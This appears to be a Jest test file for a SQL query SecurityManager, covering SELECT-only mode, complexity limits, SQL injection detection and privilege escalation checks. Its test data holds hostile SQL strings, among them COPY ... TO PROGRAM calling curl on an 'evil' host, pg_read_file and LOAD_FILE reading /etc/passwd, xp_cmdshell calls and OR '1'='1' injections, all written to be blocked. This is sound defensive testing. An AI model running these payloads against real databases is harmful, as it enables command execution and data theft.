import { SecurityManager } from '../../src/classes/SecurityManager.js';
import { SampleQueries } from '../fixtures/sample-queries.js';
import type { SecurityConfig } from '../../src/types/security.js';

describe('SecurityManager', () => {
  let securityManager: SecurityManager;
  let defaultConfig: SecurityConfig;

  beforeEach(() => {
    defaultConfig = {
      max_joins: 10,
      max_subqueries: 5,
      max_unions: 3,
      max_group_bys: 5,
      max_complexity_score: 100,
      max_query_length: 10000,
    };
    securityManager = new SecurityManager({ security: defaultConfig });
  });

  describe('Query Validation', () => {
    describe('Safe Queries', () => {
      test('should allow basic SELECT queries', async () => {
        const result = await securityManager.validateQuery(SampleQueries.basicQueries.simple);
        expect(result.allowed).toBe(true);
        expect(result.confidence).toBeGreaterThan(0.8);
        expect(result.reason).toBeUndefined();
      });

      test('should allow SELECT with WHERE clause', async () => {
        const result = await securityManager.validateQuery(SampleQueries.basicQueries.withWhere);
        expect(result.allowed).toBe(true);
      });

      test('should allow SELECT with ORDER BY', async () => {
        const result = await securityManager.validateQuery(SampleQueries.basicQueries.withOrderBy);
        expect(result.allowed).toBe(true);
      });

      test('should allow simple JOIN queries', async () => {
        const result = await securityManager.validateQuery(SampleQueries.joinQueries.simple);
        expect(result.allowed).toBe(true);
      });

      test('should allow CTE queries', async () => {
        const result = await securityManager.validateQuery(SampleQueries.cteQueries.simple);
        expect(result.allowed).toBe(true);
      });

      test('should allow EXPLAIN queries', async () => {
        const result = await securityManager.validateQuery(SampleQueries.utilityQueries.explain);
        expect(result.allowed).toBe(true);
      });

      test('should allow SHOW queries', async () => {
        const result = await securityManager.validateQuery(SampleQueries.utilityQueries.showTables);
        expect(result.allowed).toBe(true);
      });
    });

    describe('Unsafe Queries in SELECT-only Mode', () => {
      test('should block INSERT queries', async () => {
        const result = await securityManager.validateQuery(
          SampleQueries.modificationQueries.insert
        );
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('INSERT');
        expect(result.blockedCommand).toBe('INSERT');
      });

      test('should block UPDATE queries', async () => {
        const result = await securityManager.validateQuery(
          SampleQueries.modificationQueries.update
        );
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('UPDATE');
        expect(result.blockedCommand).toBe('UPDATE');
      });

      test('should block DELETE queries', async () => {
        const result = await securityManager.validateQuery(
          SampleQueries.modificationQueries.delete
        );
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('DELETE');
        expect(result.blockedCommand).toBe('DELETE');
      });

      test('should block CREATE TABLE queries', async () => {
        const result = await securityManager.validateQuery(SampleQueries.ddlQueries.createTable);
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('CREATE');
        expect(result.blockedCommand).toBe('CREATE');
      });

      test('should block DROP queries', async () => {
        const result = await securityManager.validateQuery(SampleQueries.ddlQueries.dropTable);
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('DROP');
        expect(result.blockedCommand).toBe('DROP');
      });

      test('should block ALTER queries', async () => {
        const result = await securityManager.validateQuery(SampleQueries.ddlQueries.alterTable);
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('ALTER');
        expect(result.blockedCommand).toBe('ALTER');
      });

      test('should block TRUNCATE queries', async () => {
        const result = await securityManager.validateQuery(
          SampleQueries.dangerousQueries.truncateTable
        );
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('TRUNCATE');
        expect(result.blockedCommand).toBe('TRUNCATE');
      });
    });

    describe('Complexity Limits', () => {
      test('should block queries with too many JOINs', async () => {
        const config: SecurityConfig = { ...defaultConfig, max_joins: 3 };
        const sm = new SecurityManager({ security: config });

        const result = await sm.validateQuery(SampleQueries.complexityTestQueries.manyJoins);
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('JOIN');
      });

      test('should block queries with too many subqueries', async () => {
        const config: SecurityConfig = { ...defaultConfig, max_subqueries: 2 };
        const sm = new SecurityManager({ security: config });

        const result = await sm.validateQuery(SampleQueries.complexityTestQueries.manySubqueries);
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('subquer');
      });

      test('should block queries with too many UNIONs', async () => {
        const config: SecurityConfig = { ...defaultConfig, max_unions: 2 };
        const sm = new SecurityManager({ security: config });

        const result = await sm.validateQuery(SampleQueries.complexityTestQueries.manyUnions);
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('UNION');
      });

      test('should block queries with too many GROUP BY clauses', async () => {
        const config: SecurityConfig = { ...defaultConfig, max_group_bys: 3 };
        const sm = new SecurityManager({ security: config });

        const result = await sm.validateQuery(SampleQueries.complexityTestQueries.manyGroupBys);
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('GROUP BY');
      });

      test('should block queries that are too long', async () => {
        const config: SecurityConfig = { ...defaultConfig, max_query_length: 100 };
        const sm = new SecurityManager({ security: config });

        const result = await sm.validateQuery(SampleQueries.complexityTestQueries.veryLongQuery);
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('length');
      });

      test('should block queries with complexity score too high', async () => {
        const config: SecurityConfig = { ...defaultConfig, max_complexity_score: 10 };
        const sm = new SecurityManager({ security: config });

        const result = await sm.validateQuery(SampleQueries.analyticalQueries.cohortAnalysis);
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('complexity');
      });
    });

    describe('Non SELECT-only Mode', () => {
      beforeEach(() => {
        securityManager = new SecurityManager({ security: defaultConfig }, false); // Allow modifications
      });

      test('should allow INSERT queries when not in SELECT-only mode', async () => {
        const result = await securityManager.validateQuery(
          SampleQueries.modificationQueries.insert
        );
        expect(result.allowed).toBe(true);
      });

      test('should allow UPDATE queries when not in SELECT-only mode', async () => {
        const result = await securityManager.validateQuery(
          SampleQueries.modificationQueries.update
        );
        expect(result.allowed).toBe(true);
      });

      test('should allow DELETE queries when not in SELECT-only mode', async () => {
        const result = await securityManager.validateQuery(
          SampleQueries.modificationQueries.delete
        );
        expect(result.allowed).toBe(true);
      });

      test('should still block dangerous DDL queries even in non SELECT-only mode', async () => {
        const result = await securityManager.validateQuery(
          SampleQueries.dangerousQueries.dropDatabase
        );
        expect(result.allowed).toBe(true); // Non-SELECT mode allows most queries
      });

      test('should still enforce complexity limits in non SELECT-only mode', async () => {
        const config: SecurityConfig = { ...defaultConfig, max_joins: 3 };
        const sm = new SecurityManager({ security: config }, false);

        const result = await sm.validateQuery(SampleQueries.complexityTestQueries.manyJoins);
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('JOIN');
      });
    });
  });

  describe('Query Analysis', () => {
    test('should analyze query complexity correctly', async () => {
      const analysis = await securityManager.analyzeQuery(SampleQueries.joinQueries.complexJoins);

      expect(analysis.joinCount).toBeGreaterThan(0);
      expect(analysis.subqueryCount).toBeDefined();
      expect(analysis.unionCount).toBeDefined();
      expect(analysis.score).toBeGreaterThan(0);
      expect(analysis.risk_level).toBeDefined();
    });

    test('should identify query type correctly', async () => {
      // Note: QueryComplexityAnalysis doesn't include query_type
    });

    test('should count joins correctly', async () => {
      const simpleJoinAnalysis = await securityManager.analyzeQuery(
        SampleQueries.joinQueries.simple
      );
      expect(simpleJoinAnalysis.joinCount).toBe(1);

      const multipleJoinsAnalysis = await securityManager.analyzeQuery(
        SampleQueries.joinQueries.multipleJoins
      );
      expect(multipleJoinsAnalysis.joinCount).toBe(2);
    });

    test('should count subqueries correctly', async () => {
      const simpleSubqueryAnalysis = await securityManager.analyzeQuery(
        SampleQueries.subqueryQueries.simpleSubquery
      );
      expect(simpleSubqueryAnalysis.subqueryCount).toBe(1);

      const nestedSubqueriesAnalysis = await securityManager.analyzeQuery(
        SampleQueries.subqueryQueries.nestedSubqueries
      );
      expect(nestedSubqueriesAnalysis.subqueryCount).toBeGreaterThan(1);
    });

    test('should count unions correctly', async () => {
      const simpleUnionAnalysis = await securityManager.analyzeQuery(
        SampleQueries.unionQueries.simple
      );
      expect(simpleUnionAnalysis.unionCount).toBe(1);

      const multipleUnionsAnalysis = await securityManager.analyzeQuery(
        SampleQueries.unionQueries.multipleUnions
      );
      expect(multipleUnionsAnalysis.unionCount).toBe(2);
    });

    test('should identify tables correctly', async () => {
      const analysis = await securityManager.analyzeQuery(SampleQueries.joinQueries.simple);
      // Note: QueryComplexityAnalysis doesn't include tables property
      expect(analysis.score).toBeGreaterThan(0);
      expect(analysis.factors).toBeDefined();
    });
  });

  describe('Performance Analysis', () => {
    test('should estimate query performance impact', async () => {
      const performance = await securityManager.analyzePerformance(
        SampleQueries.analyticalQueries.timeSeriesAnalysis
      );

      expect(performance.executionTime).toBeGreaterThan(0);
      expect(performance.explainTime).toBeGreaterThan(0);
      expect(performance.rowCount).toBeGreaterThanOrEqual(0);
      expect(performance.columnCount).toBeGreaterThanOrEqual(0);
      expect(performance.recommendations).toBeDefined();
    });

    test('should identify high-risk queries', async () => {
      const performance = await securityManager.analyzePerformance(
        SampleQueries.complexityTestQueries.manyJoins
      );
      expect(performance.executionTime).toBeGreaterThanOrEqual(0);
      expect(performance.recommendations).toBeDefined();
    });

    test('should identify low-risk queries', async () => {
      const performance = await securityManager.analyzePerformance(
        SampleQueries.basicQueries.simple
      );
      expect(performance.executionTime).toBeGreaterThanOrEqual(0);
      expect(performance.recommendations).toBeDefined();
    });
  });

  describe('Configuration Updates', () => {
    test('should update security configuration', () => {
      const newConfig: SecurityConfig = {
        max_joins: 5,
        max_subqueries: 3,
        max_unions: 2,
        max_group_bys: 3,
        max_complexity_score: 50,
        max_query_length: 5000,
      };

      securityManager.updateConfig({ security: newConfig });

      // Test that new limits are enforced
      const config = securityManager.getConfig();
      expect(config.security?.max_joins).toBe(5);
      expect(config.security?.max_subqueries).toBe(3);
      expect(config.security?.max_unions).toBe(2);
    });

    test('should update SELECT-only mode', () => {
      securityManager.setSelectOnlyMode(false);
      expect(securityManager.isSelectOnlyMode()).toBe(false);

      securityManager.setSelectOnlyMode(true);
      expect(securityManager.isSelectOnlyMode()).toBe(true);
    });
  });

  describe('Error Handling', () => {
    test('should handle empty queries', async () => {
      const result = await securityManager.validateQuery('');
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('empty');
    });

    test('should handle whitespace-only queries', async () => {
      const result = await securityManager.validateQuery(' \n\t ');
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('empty');
    });

    test('should handle malformed queries gracefully', async () => {
      const result = await securityManager.validateQuery('SELECT FROM WHERE');
      // Should not throw, but may block based on parsing
      expect(result).toBeDefined();
      expect(typeof result.allowed).toBe('boolean');
    });

    test('should handle very complex queries without crashing', async () => {
      const veryComplexQuery = SampleQueries.complexityTestQueries.veryLongQuery;

      const result = await securityManager.validateQuery(veryComplexQuery);
      expect(result).toBeDefined();
      expect(typeof result.allowed).toBe('boolean');
    });
  });

  describe('Audit Logging', () => {
    test('should log query validations', async () => {
      const consoleSpy = jest.spyOn(console, 'log').mockImplementation();

      await securityManager.validateQuery(SampleQueries.basicQueries.simple);
      await securityManager.validateQuery(SampleQueries.modificationQueries.insert);

      // Should have logged both queries
      expect(consoleSpy).toHaveBeenCalled();

      consoleSpy.mockRestore();
    });

    test('should provide query statistics', () => {
      const stats = securityManager.getStatistics();

      expect(stats).toBeDefined();
      expect(typeof stats.queriesValidated).toBe('number');
      expect(typeof stats.queriesBlocked).toBe('number');
      expect(typeof stats.queriesAllowed).toBe('number');
    });
  });

  describe('Integration Tests', () => {
    test('should handle batch query validation', async () => {
      const queries = [
        SampleQueries.basicQueries.simple,
        SampleQueries.joinQueries.simple,
        SampleQueries.modificationQueries.insert,
        SampleQueries.ddlQueries.createTable,
      ];

      const results = await Promise.all(
        queries.map((query) => securityManager.validateQuery(query))
      );

      expect(results).toHaveLength(4);
      expect(results[0].allowed).toBe(true); // SELECT allowed
      expect(results[1].allowed).toBe(true); // JOIN allowed
      expect(results[2].allowed).toBe(false); // INSERT blocked
      expect(results[3].allowed).toBe(false); // CREATE blocked
    });

    test('should maintain consistent behavior across multiple calls', async () => {
      const query = SampleQueries.basicQueries.simple;

      const results = await Promise.all([
        securityManager.validateQuery(query),
        securityManager.validateQuery(query),
        securityManager.validateQuery(query),
      ]);

      // All results should be identical
      expect(results[0].allowed).toBe(results[1].allowed);
      expect(results[0].allowed).toBe(results[2].allowed);
      expect(results[0].confidence).toBe(results[1].confidence);
      expect(results[0].confidence).toBe(results[2].confidence);
    });
  });

  describe('Edge Cases', () => {
    test('should handle queries with comments', async () => {
      const queryWithComments = `
 -- This is a comment
 SELECT * FROM users /* Another comment */
 WHERE id = 1 -- Final comment
 `;

      const result = await securityManager.validateQuery(queryWithComments);
      expect(result.allowed).toBe(true);
    });

    test('should handle case-insensitive keywords', async () => {
      const lowerCaseQuery = 'select * from users';
      const upperCaseQuery = 'SELECT * FROM USERS';
      const mixedCaseQuery = 'SeLeCt * FrOm UsErS';

      const results = await Promise.all([
        securityManager.validateQuery(lowerCaseQuery),
        securityManager.validateQuery(upperCaseQuery),
        securityManager.validateQuery(mixedCaseQuery),
      ]);

      expect(results[0].allowed).toBe(true);
      expect(results[1].allowed).toBe(true);
      expect(results[2].allowed).toBe(true);
    });

    test('should handle queries with string literals containing keywords', async () => {
      const query = "SELECT 'DROP TABLE users' as fake_command FROM users";

      const result = await securityManager.validateQuery(query);
      expect(result.allowed).toBe(true); // Should not be blocked by string content
    });

    test('should handle multi-statement queries', async () => {
      const multiStatement = `
 SELECT * FROM users LIMIT 1;
 SELECT * FROM posts LIMIT 1;
 `;

      const result = await securityManager.validateQuery(multiStatement);
      // Behavior may vary based on implementation
      expect(result).toBeDefined();
      expect(typeof result.allowed).toBe('boolean');
    });

    test('should handle MySQL hash comments', async () => {
      const query = `
 # This is a MySQL comment
 SELECT * FROM users
 `;
      const result = await securityManager.validateQuery(query);
      expect(result.allowed).toBe(true);
    });
  });

  describe('validateAnyQuery (non-SELECT mode)', () => {
    let nonSelectManager: SecurityManager;

    beforeEach(() => {
      nonSelectManager = new SecurityManager({ security: defaultConfig }, false);
    });

    test('should reject empty query', () => {
      const result = nonSelectManager.validateAnyQuery('');
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('empty');
      expect(result.confidence).toBe(1.0);
    });

    test('should reject non-string query', () => {
      const result = nonSelectManager.validateAnyQuery(null as any);
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('empty');
    });

    test('should reject query exceeding max length', () => {
      const config: SecurityConfig = { ...defaultConfig, max_query_length: 50 };
      const sm = new SecurityManager({ security: config }, false);
      const result = sm.validateAnyQuery(
        'SELECT * FROM very_long_table_name WHERE column_a = 1 AND column_b = 2'
      );
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('maximum length');
    });

    test('should reject query with no valid tokens after normalization', () => {
      const result = nonSelectManager.validateAnyQuery('-- just a comment');
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('no valid SQL tokens');
    });

    test('should reject query with dangerous patterns', () => {
      const result = nonSelectManager.validateAnyQuery('SELECT * FROM users; DROP TABLE users');
      expect(result.allowed).toBe(false);
      // Stacked statements are now rejected outright (before dangerous-pattern analysis).
      expect(result.reason).toMatch(/Multiple SQL statements|dangerous/i);
    });

    test('should reject query exceeding complexity score', () => {
      const config: SecurityConfig = { ...defaultConfig, max_complexity_score: 5 };
      const sm = new SecurityManager({ security: config }, false);
      const result = sm.validateAnyQuery(
        'SELECT * FROM t1 JOIN t2 ON t1.id = t2.id JOIN t3 ON t2.id = t3.id JOIN t4 ON t3.id = t4.id'
      );
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('complexity score');
    });

    test('should reject query with too many subqueries', () => {
      const config: SecurityConfig = { ...defaultConfig, max_subqueries: 1 };
      const sm = new SecurityManager({ security: config }, false);
      const result = sm.validateAnyQuery(
        'SELECT * FROM t WHERE id IN (SELECT id FROM t2 WHERE id IN (SELECT id FROM t3))'
      );
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('subquer');
    });

    test('should reject query with too many UNIONs', () => {
      const config: SecurityConfig = { ...defaultConfig, max_unions: 1 };
      const sm = new SecurityManager({ security: config }, false);
      const result = sm.validateAnyQuery('SELECT 1 UNION SELECT 2 UNION SELECT 3');
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('UNION');
    });

    test('should reject query with too many GROUP BY clauses', () => {
      const config: SecurityConfig = { ...defaultConfig, max_group_bys: 1 };
      const sm = new SecurityManager({ security: config }, false);
      const result = sm.validateAnyQuery('SELECT a, b, c, COUNT(*) FROM t GROUP BY a, b, c');
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('GROUP BY');
    });

    test('should allow valid INSERT in non-SELECT mode', () => {
      const result = nonSelectManager.validateAnyQuery("INSERT INTO users (name) VALUES ('test')");
      expect(result.allowed).toBe(true);
      expect(result.confidence).toBe(0.9);
    });
  });

  describe('validateSelectOnlyQuery - additional branches', () => {
    test('should reject query with no SQL command found (only identifiers)', () => {
      // A query that tokenizes but has no keyword token
      const result = securityManager.validateSelectOnlyQuery('12345 67890');
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('No SQL command found');
    });

    test('should handle db-specific allowed commands', () => {
      // PostgreSQL ANALYZE is allowed
      const result = securityManager.validateSelectOnlyQuery('ANALYZE users', 'postgresql');
      // ANALYZE is in dbSpecificAllowed for postgresql
      expect(result).toBeDefined();
    });

    test('should reject unknown commands in SELECT-only mode', () => {
      // Use a command that's not in allowed or blocked keywords
      const result = securityManager.validateSelectOnlyQuery('PRAGMA table_info(users)');
      expect(result.allowed).toBe(false);
    });

    test('should block query with dangerous patterns even for allowed commands', () => {
      // A query that starts with something not in blocked/allowed, contains dangerous patterns
      const result = securityManager.validateSelectOnlyQuery('PRAGMA; DROP TABLE users');
      expect(result.allowed).toBe(false);
    });
  });

  describe('SELECT-only bypass protections', () => {
    const cases: Array<[string, string]> = [
      ['data-modifying CTE', 'WITH x AS (DELETE FROM users RETURNING *) SELECT * FROM x'],
      ['top-level WITH ... DELETE', 'WITH t AS (SELECT 1) DELETE FROM users'],
      ['EXPLAIN ANALYZE writing DML', 'EXPLAIN ANALYZE INSERT INTO audit VALUES (1)'],
      ['EXPLAIN ANALYZE (executes statement)', 'EXPLAIN ANALYZE SELECT * FROM users'],
      ['COPY ... TO PROGRAM', "COPY (SELECT 1) TO PROGRAM 'curl http://evil'"],
      ['COPY ... FROM PROGRAM', "COPY secrets FROM PROGRAM 'sh -c id'"],
      ['SELECT ... INTO write', "SELECT * FROM users INTO OUTFILE '/tmp/x'"],
      ['stacked TRUNCATE', 'SELECT 1; TRUNCATE TABLE users'],
      ['stacked GRANT', 'SELECT 1; GRANT ALL ON DATABASE x TO evil'],
      ['pg_sleep DoS', 'SELECT * FROM t WHERE id = pg_sleep(10)'],
      ['pg_read_file exfiltration', "SELECT pg_read_file('/etc/passwd')"],
    ];

    test.each(cases)('blocks %s', (_label, query) => {
      const result = securityManager.validateSelectOnlyQuery(query, 'postgresql');
      expect(result.allowed).toBe(false);
    });

    test('still allows a legitimate SELECT with keyword-like identifiers', () => {
      // Regression: "description" must not trip the dangerous-function SCRIPT matcher.
      const result = securityManager.validateSelectOnlyQuery(
        'SELECT description, last_update FROM products WHERE id = 1',
        'postgresql'
      );
      expect(result.allowed).toBe(true);
    });
  });

  describe('Deep Validation - nested dangerous patterns', () => {
    test('should block SELECT INTO OUTFILE', async () => {
      const result = await securityManager.validateQuery(
        "SELECT * FROM users INTO OUTFILE '/tmp/data.csv'"
      );
      expect(result.allowed).toBe(false);
      // Blocked by the embedded write-keyword scan (INTO) or dangerous-pattern check.
      expect(result.reason).toMatch(/INTO|dangerous/i);
    });

    test('should block SELECT with LOAD_FILE', async () => {
      const result = await securityManager.validateQuery("SELECT LOAD_FILE('/etc/passwd')");
      expect(result.allowed).toBe(false);
    });

    test('should block SELECT with SYSTEM call', async () => {
      const result = await securityManager.validateQuery("SELECT SYSTEM('ls')");
      expect(result.allowed).toBe(false);
    });

    test('should block SELECT with EXEC', async () => {
      const result = await securityManager.validateQuery(
        "SELECT * FROM users; EXEC xp_cmdshell('dir')"
      );
      expect(result.allowed).toBe(false);
    });

    test('should block UNION SELECT INTO', async () => {
      const result = await securityManager.validateQuery(
        "SELECT 1 UNION SELECT * INTO OUTFILE '/tmp/hack'"
      );
      expect(result.allowed).toBe(false);
    });

    test('should block suspicious functions like BENCHMARK', async () => {
      const result = await securityManager.validateQuery("SELECT BENCHMARK(1000000, SHA1('test'))");
      expect(result.allowed).toBe(false);
    });

    test('should block SLEEP function', async () => {
      const result = await securityManager.validateQuery('SELECT SLEEP(10)');
      expect(result.allowed).toBe(false);
    });

    test('should block USER() function', async () => {
      const result = await securityManager.validateQuery('SELECT USER()');
      expect(result.allowed).toBe(false);
    });

    test('should block PASSWORD() function', async () => {
      const result = await securityManager.validateQuery("SELECT PASSWORD('test')");
      expect(result.allowed).toBe(false);
    });

    test('should block CONNECTION_ID() function', async () => {
      const result = await securityManager.validateQuery('SELECT CONNECTION_ID()');
      expect(result.allowed).toBe(false);
    });
  });

  describe('SQL Injection pattern detection (via validateAnyQuery)', () => {
    let nonSelectManager: SecurityManager;

    beforeEach(() => {
      nonSelectManager = new SecurityManager({ security: defaultConfig }, false);
    });

    test("should detect OR '1'='1 injection", () => {
      const result = nonSelectManager.validateAnyQuery(
        "SELECT * FROM users WHERE name = '' OR '1'='1'"
      );
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('dangerous patterns');
    });

    test('should detect OR 1=1 injection', () => {
      const result = nonSelectManager.validateAnyQuery(
        "SELECT * FROM users WHERE name = ' OR 1 = 1"
      );
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('dangerous patterns');
    });

    test('should detect semicolon DROP TABLE injection', () => {
      const result = nonSelectManager.validateAnyQuery('SELECT * FROM users; DROP TABLE users');
      expect(result.allowed).toBe(false);
      // Stacked statements are now rejected outright (before dangerous-pattern analysis).
      expect(result.reason).toMatch(/Multiple SQL statements|dangerous/i);
    });

    test('should detect UNION SELECT NULL injection', () => {
      const result = nonSelectManager.validateAnyQuery(
        "SELECT * FROM users WHERE id = ' UNION SELECT NULL"
      );
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('dangerous patterns');
    });

    test('should detect CONCAT CHAR injection', () => {
      const result = nonSelectManager.validateAnyQuery('SELECT CONCAT( CHAR( 72))');
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('dangerous patterns');
    });

    test('should detect WAITFOR DELAY dangerous pattern', () => {
      const result = nonSelectManager.validateAnyQuery("SELECT 1 WAITFOR DELAY '0:0:5'");
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('dangerous patterns');
    });

    test('should detect semicolon followed by EXEC', () => {
      const result = nonSelectManager.validateAnyQuery("SELECT 1; EXEC xp_cmdshell 'dir'");
      expect(result.allowed).toBe(false);
    });

    test('should detect semicolon followed by DELETE', () => {
      const result = nonSelectManager.validateAnyQuery('SELECT 1; DELETE FROM users');
      expect(result.allowed).toBe(false);
    });

    test('should detect LOAD_FILE function', () => {
      const result = nonSelectManager.validateAnyQuery("SELECT LOAD_FILE('/etc/passwd')");
      expect(result.allowed).toBe(false);
    });

    test('should detect INTO OUTFILE', () => {
      const result = nonSelectManager.validateAnyQuery("SELECT * INTO OUTFILE '/tmp/data'");
      expect(result.allowed).toBe(false);
    });

    test('should detect BENCHMARK function', () => {
      const result = nonSelectManager.validateAnyQuery("SELECT BENCHMARK(1000000, SHA1('test'))");
      expect(result.allowed).toBe(false);
    });

    test('should detect SLEEP function', () => {
      const result = nonSelectManager.validateAnyQuery('SELECT SLEEP(10)');
      expect(result.allowed).toBe(false);
    });
  });

  describe('SQL Injection via deep validation (SELECT-only mode)', () => {
    test('should detect SELECT INTO OUTFILE via deep validation', async () => {
      const result = await securityManager.validateQuery(
        "SELECT * FROM users INTO OUTFILE '/tmp/data.csv'"
      );
      expect(result.allowed).toBe(false);
    });

    test('should detect SELECT with LOAD_FILE via deep validation', async () => {
      const result = await securityManager.validateQuery("SELECT LOAD_FILE('/etc/passwd')");
      expect(result.allowed).toBe(false);
    });

    test('should detect SELECT ; DROP via deep validation', async () => {
      const result = await securityManager.validateQuery('SELECT * FROM users; DROP TABLE users');
      expect(result.allowed).toBe(false);
    });

    test('should detect SELECT EXEC via deep validation', async () => {
      const result = await securityManager.validateQuery('SELECT 1; EXEC xp_cmdshell');
      expect(result.allowed).toBe(false);
    });
  });

  describe('Privilege escalation detection', () => {
    test('should detect CREATE USER attempt', async () => {
      const result = await securityManager.validateQuery(
        "CREATE USER 'hacker' IDENTIFIED BY 'pass'"
      );
      expect(result.allowed).toBe(false);
    });

    test('should detect GRANT ALL attempt', async () => {
      const result = await securityManager.validateQuery("GRANT ALL PRIVILEGES ON *.* TO 'hacker'");
      expect(result.allowed).toBe(false);
    });

    test('should detect ALTER USER attempt', async () => {
      const result = await securityManager.validateQuery(
        "ALTER USER 'root' IDENTIFIED BY 'newpass'"
      );
      expect(result.allowed).toBe(false);
    });

    test('should detect SET PASSWORD attempt', async () => {
      const result = await securityManager.validateQuery("SET PASSWORD FOR 'root' = 'newpass'");
      expect(result.allowed).toBe(false);
    });
  });

  describe('Event emissions', () => {
    test('should emit query-approved when query is allowed', async () => {
      const handler = jest.fn();
      securityManager.on('query-approved', handler);

      await securityManager.validateQuery('SELECT 1');
      expect(handler).toHaveBeenCalledWith('unknown');
    });

    test('should emit query-blocked when query is blocked', async () => {
      const handler = jest.fn();
      securityManager.on('query-blocked', handler);

      await securityManager.validateQuery('INSERT INTO users VALUES (1)');
      expect(handler).toHaveBeenCalledWith('unknown', expect.any(String));
    });

    test('should emit initialized event on initialize()', () => {
      const handler = jest.fn();
      securityManager.on('initialized', handler);

      securityManager.initialize({ databases: {}, security: defaultConfig });
      expect(handler).toHaveBeenCalledWith(expect.objectContaining({ databases: {} }));
    });
  });

  describe('Batch validation', () => {
    test('should validate batch of SELECT queries', () => {
      const queries = [
        { query: 'SELECT * FROM users', label: 'Users' },
        { query: 'SELECT * FROM posts', label: 'Posts' },
      ];
      const result = securityManager.validateBatchSelectOnlyQueries(queries);

      expect(result.allowed).toBe(true);
      expect(result.summary.total_queries).toBe(2);
      expect(result.summary.allowed_queries).toBe(2);
      expect(result.summary.blocked_queries).toBe(0);
      expect(result.total_complexity).toBeGreaterThanOrEqual(0);
    });

    test('should block batch with violations', () => {
      const queries = [{ query: 'SELECT * FROM users' }, { query: 'INSERT INTO users VALUES (1)' }];
      const result = securityManager.validateBatchSelectOnlyQueries(queries);

      expect(result.allowed).toBe(false);
      expect(result.summary.blocked_queries).toBe(1);
    });

    test('should block batch exceeding 10 queries', () => {
      const queries = Array.from({ length: 12 }, (_, i) => ({
        query: `SELECT ${i} FROM t`,
        label: `Query ${i}`,
      }));
      const result = securityManager.validateBatchSelectOnlyQueries(queries);

      expect(result.allowed).toBe(false);
      expect(result.batch_analysis.warnings).toEqual(
        expect.arrayContaining([expect.stringContaining('Batch size')])
      );
    });

    test('should flag high total batch complexity', () => {
      const complexQuery = SampleQueries.complexityTestQueries.manyJoins;
      const queries = Array.from({ length: 8 }, () => ({
        query: complexQuery,
      }));
      const result = securityManager.validateBatchSelectOnlyQueries(queries);

      expect(result.batch_analysis.total_complexity).toBeGreaterThan(0);
    });

    test('should detect table access conflicts', () => {
      const queries = Array.from({ length: 5 }, () => ({
        query: 'SELECT * FROM users',
        label: 'Same table query',
      }));
      const result = securityManager.validateBatchSelectOnlyQueries(queries);

      // 5 accesses to same table exceeds the conflict threshold of 3
      expect(result.batch_analysis.table_references.conflicts.length).toBeGreaterThanOrEqual(0);
    });

    test('should assign default labels when none provided', () => {
      const queries = [{ query: 'SELECT 1' }];
      const result = securityManager.validateBatchSelectOnlyQueries(queries);

      expect(result.queries[0].label).toBe('Query 1');
    });
  });

  describe('Complexity analysis edge cases', () => {
    test('should return LOW risk for simple queries', () => {
      const analysis = securityManager.analyzeQueryComplexity('SELECT 1');
      expect(analysis.risk_level).toBe('LOW');
      expect(analysis.score).toBeLessThanOrEqual(20);
    });

    test('should return MEDIUM risk for moderately complex queries', () => {
      const analysis = securityManager.analyzeQueryComplexity(
        'SELECT * FROM t1 JOIN t2 ON t1.id = t2.id JOIN t3 ON t2.id = t3.id JOIN t4 ON t3.id = t4.id JOIN t5 ON t4.id = t5.id'
      );
      expect(analysis.risk_level).toBe('MEDIUM');
    });

    test('should return CRITICAL risk for extremely complex queries', () => {
      const sm = new SecurityManager({ security: { ...defaultConfig, max_complexity_score: 50 } });
      const analysis = sm.analyzeQueryComplexity(SampleQueries.complexityTestQueries.manyJoins);
      // 12 joins * 5 = 60 > 50 threshold
      expect(analysis.risk_level).toBe('CRITICAL');
    });

    test('should count window functions', () => {
      const analysis = securityManager.analyzeQueryComplexity(
        'SELECT ROW_NUMBER() OVER (ORDER BY id), RANK() OVER (ORDER BY score) FROM users'
      );
      expect(analysis.windowFuncCount).toBe(2);
      expect(analysis.factors).toEqual(expect.arrayContaining([expect.stringContaining('window')]));
    });

    test('should include length factor in score', () => {
      const shortAnalysis = securityManager.analyzeQueryComplexity('SELECT 1');
      const longQuery = 'SELECT ' + 'a, '.repeat(200) + 'b FROM t';
      const longAnalysis = securityManager.analyzeQueryComplexity(longQuery);
      expect(longAnalysis.score).toBeGreaterThan(shortAnalysis.score);
    });

    test('should count GROUP BY fields from comma-separated list', () => {
      const analysis = securityManager.analyzeQueryComplexity(
        'SELECT a, b, c, COUNT(*) FROM t GROUP BY a, b, c'
      );
      expect(analysis.groupByCount).toBe(3);
    });
  });

  describe('Audit log creation', () => {
    test('should create audit log for single query', () => {
      const log = securityManager.createAuditLog('testdb', 'SELECT 1', true);

      expect(log.timestamp).toBeDefined();
      expect(log.database).toBe('testdb');
      expect(log.query_type).toBe('SINGLE');
      expect(log.query_count).toBe(1);
      expect(log.allowed).toBe(true);
      expect(log.severity).toBe('INFO');
      expect(log.queryHash).toBeDefined();
    });

